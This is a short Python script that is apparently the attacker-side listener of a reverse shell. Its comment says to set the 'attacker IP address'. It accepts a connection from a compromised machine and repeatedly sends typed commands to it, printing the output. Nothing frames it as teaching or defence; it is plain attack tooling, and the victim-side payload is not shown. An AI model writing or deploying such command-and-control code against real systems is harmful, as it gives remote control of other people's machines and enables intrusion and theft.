import socket

HOST = '127.0.0.1' #change IP to attacker IP address 
PORT = 9090

server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind((HOST,PORT))



server.listen()

client, address = server.accept()


while True:
    print(f"Connect to {address}")
    cmd_input = input("Enter command:  ")
    client.send(cmd_input.encode('utf-8'))
    print(client.recv(1024).decode('utf-8'))